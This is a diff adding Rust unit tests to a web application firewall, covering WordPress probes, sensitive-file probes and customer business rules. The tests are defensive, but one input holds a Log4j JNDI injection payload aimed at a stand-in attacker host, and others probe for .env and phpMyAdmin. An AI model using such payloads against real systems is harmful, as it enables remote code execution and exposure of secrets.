@@ -413,3 +413,149 @@ fn test_stateful_credential_stuffing_detection() {
     assert!(proof.active_islands.contains(&"ISLAND-STATEFUL".to_string()));
 }
 
+#[test]
+fn test_wordpress_shield_toggle() {
+    use exactor_waf_guardian::config::{BusinessRulesConfig, IslandsConfig};
+
+    // 1. When WordPress shield is ENABLED (default on non-WP sites like exactor.tech)
+    let engine_shield_on = ExactorSatEngine::new();
+    let wp_probe = HttpRequestPayload::new("GET", "/wp-login.php", "", "");
+    let proof_blocked = engine_shield_on.evaluate_payload(&wp_probe);
+
+    assert!(proof_blocked.is_violation);
+    assert_eq!(proof_blocked.action, AttackDecision::Block);
+    assert_eq!(proof_blocked.category, AttackCategory::CmsWordpressProbe);
+    assert!(proof_blocked.matched_rules.iter().any(|r| r.rule_id == "SAT-WP-01"));
+    assert!(proof_blocked.active_islands.contains(&"ISLAND-WORDPRESS".to_string()));
+
+    // 2. When WordPress shield is DISABLED (for legitimate WordPress installations)
+    let islands_off = IslandsConfig {
+        wordpress_shield: false,
+        exposure_shield: true,
+        framework_shield: true,
+    };
+    let engine_shield_off = ExactorSatEngine::with_config(islands_off, BusinessRulesConfig::default());
+    let proof_allowed = engine_shield_off.evaluate_payload(&wp_probe);
+
+    assert!(!proof_allowed.is_violation);
+    assert_eq!(proof_allowed.action, AttackDecision::Allow);
+    assert_eq!(proof_allowed.category, AttackCategory::Benign);
+}
+
+#[test]
+fn test_sensitive_exposure_shield() {
+    let engine = ExactorSatEngine::new();
+
+    // Probing for .env
+    let env_probe = HttpRequestPayload::new("GET", "/.env", "", "");
+    let proof_env = engine.evaluate_payload(&env_probe);
+    assert!(proof_env.is_violation);
+    assert_eq!(proof_env.category, AttackCategory::SensitiveExposureProbe);
+    assert!(proof_env.matched_rules.iter().any(|r| r.rule_id == "SAT-EXP-01"));
+
+    // Probing for phpMyAdmin
+    let pma_probe = HttpRequestPayload::new("GET", "/phpmyadmin/index.php", "", "");
+    let proof_pma = engine.evaluate_payload(&pma_probe);
+    assert!(proof_pma.is_violation);
+    assert_eq!(proof_pma.category, AttackCategory::SensitiveExposureProbe);
+    assert!(proof_pma.matched_rules.iter().any(|r| r.rule_id == "SAT-EXP-02"));
+}
+
+#[test]
+fn test_framework_exploit_shield() {
+    let engine = ExactorSatEngine::new();
+
+    // Log4j / JNDI injection in query string
+    let log4j_probe = HttpRequestPayload::new("GET", "/search", "q=${jndi:ldap://evil.com/x}", "");
+    let proof = engine.evaluate_payload(&log4j_probe);
+    assert!(proof.is_violation);
+    assert_eq!(proof.category, AttackCategory::FrameworkExploitProbe);
+    assert!(proof.matched_rules.iter().any(|r| r.rule_id == "SAT-FW-01"));
+}
+
+#[test]
+fn test_customer_business_rules_enforcement() {
+    use exactor_waf_guardian::config::{BusinessRulesConfig, CustomBusinessRule, IslandsConfig};
+
+    let biz_rules = BusinessRulesConfig {
+        enabled: true,
+        rules: vec![
+            // Rule 1: Method restrictions on /api/
+            CustomBusinessRule {
+                id: "rule-method".to_string(),
+                name: "Allowed Methods for API".to_string(),
+                path_prefix: Some("/api/".to_string()),
+                allowed_methods: Some(vec!["GET".to_string(), "POST".to_string()]),
+                blocked_methods: Some(vec!["DELETE".to_string()]),
+                allowed_ips: None,
+                blocked_ips: None,
+                required_headers: None,
+                max_body_bytes: None,
+                enabled: true,
+            },
+            // Rule 2: IP restriction on /admin/
+            CustomBusinessRule {
+                id: "rule-admin-ip".to_string(),
+                name: "Admin IP Whitelist".to_string(),
+                path_prefix: Some("/admin/".to_string()),
+                allowed_methods: None,
+                blocked_methods: None,
+                allowed_ips: Some(vec!["10.0.0.1".to_string()]),
+                blocked_ips: None,
+                required_headers: None,
+                max_body_bytes: None,
+                enabled: true,
+            },
+            // Rule 3: Required header on /checkout/
+            CustomBusinessRule {
+                id: "rule-checkout-header".to_string(),
+                name: "Tenant Header Required".to_string(),
+                path_prefix: Some("/checkout/".to_string()),
+                allowed_methods: None,
+                blocked_methods: None,
+                allowed_ips: None,
+                blocked_ips: None,
+                required_headers: Some(vec!["X-Tenant-ID".to_string()]),
+                max_body_bytes: None,
+                enabled: true,
+            },
+        ],
+    };
+
+    let engine = ExactorSatEngine::with_config(IslandsConfig::default(), biz_rules);
+
+    // 1. DELETE /api/items -> Violates Rule 1 (blocked method)
+    let del_req = HttpRequestPayload::new("DELETE", "/api/items", "", "");
+    let proof_del = engine.evaluate_payload(&del_req);
+    assert!(proof_del.is_violation);
+    assert_eq!(proof_del.category, AttackCategory::BusinessRuleViolation);
+    assert!(proof_del.matched_rules.iter().any(|r| r.rule_id == "SAT-BIZ-01"));
+
+    // 2. GET /admin/dashboard with unauthorized IP -> Violates Rule 2
+    let mut admin_req = HttpRequestPayload::new("GET", "/admin/dashboard", "", "");
+    admin_req.client_ip = Some("203.0.113.50".to_string());
+    let proof_admin = engine.evaluate_payload(&admin_req);
+    assert!(proof_admin.is_violation);
+    assert_eq!(proof_admin.category, AttackCategory::BusinessRuleViolation);
+    assert!(proof_admin.matched_rules.iter().any(|r| r.rule_id == "SAT-BIZ-02"));
+
+    // 3. GET /admin/dashboard with whitelisted IP -> Allowed
+    admin_req.client_ip = Some("10.0.0.1".to_string());
+    let proof_admin_ok = engine.evaluate_payload(&admin_req);
+    assert!(!proof_admin_ok.is_violation);
+
+    // 4. POST /checkout/order missing X-Tenant-ID -> Violates Rule 3
+    let checkout_req = HttpRequestPayload::new("POST", "/checkout/order", "", "items=1");
+    let proof_checkout = engine.evaluate_payload(&checkout_req);
+    assert!(proof_checkout.is_violation);
+    assert_eq!(proof_checkout.category, AttackCategory::BusinessRuleViolation);
+    assert!(proof_checkout.matched_rules.iter().any(|r| r.rule_id == "SAT-BIZ-03"));
+
+    // 5. POST /checkout/order with X-Tenant-ID -> Allowed
+    let mut checkout_ok = HttpRequestPayload::new("POST", "/checkout/order", "", "items=1");
+    checkout_ok.headers.insert("X-Tenant-ID".to_string(), "tenant_12345".to_string());
+    let proof_checkout_ok = engine.evaluate_payload(&checkout_ok);
+    assert!(!proof_checkout_ok.is_violation);
+}
+
+
